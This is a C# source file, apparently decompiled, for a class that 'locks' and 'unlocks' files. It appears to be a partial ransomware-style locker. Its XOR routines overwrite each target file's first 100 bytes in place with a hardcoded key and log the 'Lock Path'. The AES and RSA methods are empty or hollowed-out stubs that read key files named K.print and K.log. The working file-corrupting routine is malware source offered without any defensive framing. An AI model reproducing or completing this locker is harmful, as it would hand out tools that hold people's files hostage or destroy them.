using System;
using System.IO;

namespace Leen;

internal class EncryptionOperation
{
	private FileSystemOperator fileSystemOperator = new FileSystemOperator();

	public void EncryptFileAES(string filepath)
	{
		Console.WriteLine("Start lock");
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
		Directory.CreateDirectory(folderPath + "\\Driver");
		folderPath += "\\Driver";
		long num = UnixTimeNowMS();
		byte[] array = File.ReadAllBytes(filepath);
		Console.WriteLine(array.Length);
		long num2 = UnixTimeNowMS() - num;
		FileInfo fileInfo = new FileInfo(filepath);
		fileSystemOperator.WriteLog("Lock Path = " + filepath + " File Length = " + Convert.ToString(fileInfo.Length / 1000000L) + " MB  Total Time = " + Convert.ToString(num2) + "ms");
	}

	public void EncryptFileXOR(string filepath)
	{
		Console.WriteLine("Start lock");
		long num = UnixTimeNowMS();
		byte[] keys = new byte[100]
		{
			1, 8, 3, 5, 7, 0, 8, 8, 1, 9,
			6, 6, 7, 4, 3, 2, 1, 3, 1, 5,
			1, 8, 3, 5, 7, 0, 8, 8, 1, 9,
			6, 6, 7, 4, 3, 2, 1, 3, 1, 5,
			1, 8, 3, 5, 7, 0, 8, 8, 1, 9,
			6, 6, 7, 4, 3, 2, 1, 3, 1, 5,
			1, 8, 3, 5, 7, 0, 8, 8, 1, 9,
			6, 6, 7, 4, 3, 2, 1, 3, 1, 5,
			1, 8, 3, 5, 7, 0, 8, 8, 1, 9,
			6, 6, 7, 4, 3, 2, 1, 3, 1, 5
		};
		byte[] originData = new byte[100];
		byte[] data = new byte[100];
		ReplaceData(filepath, 0, originData, data, keys);
		long num2 = UnixTimeNowMS() - num;
		FileInfo fileInfo = new FileInfo(filepath);
		fileSystemOperator.WriteLog("Lock Path = " + filepath + " File Length = " + Convert.ToString(fileInfo.Length / 1000000L) + " MB  Total Time = " + Convert.ToString(num2) + "ms");
	}

	public void EncryptFileRSA(string filepath)
	{
	}

	public void DecryptFileRSA(string filepath)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		_ = folderPath + "\\K.log";
		_ = File.ReadAllText(filepath).Split(new char[1] { ',' })[0];
		File.ReadAllBytes(filepath);
	}

	public void DecryptFileAES(string filepath)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
		Directory.CreateDirectory(folderPath + "\\Driver");
		folderPath += "\\Driver";
		string text = folderPath + "\\K.print";
		Console.WriteLine(text);
		_ = File.ReadAllText(text).Split(new char[1] { ',' })[0];
		_ = File.ReadAllText(text).Split(new char[1] { ',' })[1];
		long num = UnixTimeNowMS();
		File.ReadAllBytes(filepath);
		long num2 = UnixTimeNowMS() - num;
		fileSystemOperator.WriteLog("Unlock Path = " + filepath + "Total Time = " + Convert.ToString(num2) + "ms");
	}

	public void DecryptFileXOR(string filepath)
	{
		long num = UnixTimeNowMS();
		byte[] keys = new byte[100]
		{
			1, 8, 3, 5, 7, 0, 8, 8, 1, 9,
			6, 6, 7, 4, 3, 2, 1, 3, 1, 5,
			1, 8, 3, 5, 7, 0, 8, 8, 1, 9,
			6, 6, 7, 4, 3, 2, 1, 3, 1, 5,
			1, 8, 3, 5, 7, 0, 8, 8, 1, 9,
			6, 6, 7, 4, 3, 2, 1, 3, 1, 5,
			1, 8, 3, 5, 7, 0, 8, 8, 1, 9,
			6, 6, 7, 4, 3, 2, 1, 3, 1, 5,
			1, 8, 3, 5, 7, 0, 8, 8, 1, 9,
			6, 6, 7, 4, 3, 2, 1, 3, 1, 5
		};
		byte[] originData = new byte[100];
		byte[] data = new byte[100];
		ReplaceData(filepath, 0, originData, data, keys);
		long num2 = UnixTimeNowMS() - num;
		fileSystemOperator.WriteLog("Unlock Path = " + filepath + "Total Time = " + Convert.ToString(num2) + "ms");
	}

	public static void ReplaceData(string filename, int position, byte[] originData, byte[] data, byte[] keys)
	{
		using Stream stream = File.Open(filename, FileMode.Open);
		stream.Position = position;
		stream.Read(originData, 0, data.Length);
		stream.Position = position;
		for (int i = 0; i < originData.Length; i++)
		{
			data[i] = (byte)(originData[i] ^ keys[i]);
			Console.WriteLine(filename + "---" + Convert.ToString(originData[i]) + "---" + Convert.ToString(data[i]));
		}
		stream.Write(data, 0, data.Length);
		stream.Flush();
		stream.Close();
	}

	public long UnixTimeNowMS()
	{
		return (long)(DateTime.UtcNow - new DateTime(1970, 1, 1, 0, 0, 0)).TotalMilliseconds;
	}
}
